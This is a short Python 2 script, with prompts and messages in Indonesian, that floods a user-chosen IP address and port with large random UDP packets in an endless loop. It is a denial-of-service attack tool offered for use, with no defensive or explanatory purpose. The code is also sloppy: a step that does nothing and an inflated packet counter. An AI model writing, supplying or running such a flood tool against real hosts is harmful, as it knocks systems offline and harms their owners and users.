import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#######################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9000)
#######################################################
print
ip = raw_input("MASUKAN IP TAGET ===> ")
port = input("Port       ===> ")
os.system("clear")
os.system("figlet Loading..")
print "'\033[35;1m'membutuhkan waktu 5 detik"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 10000000000000000
     port = port + 0
     print "'\033[31;1m'CONNETING %s'\033[31;1m' AND SEND PACKET TO ====> %s'\033[31;1m' port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1


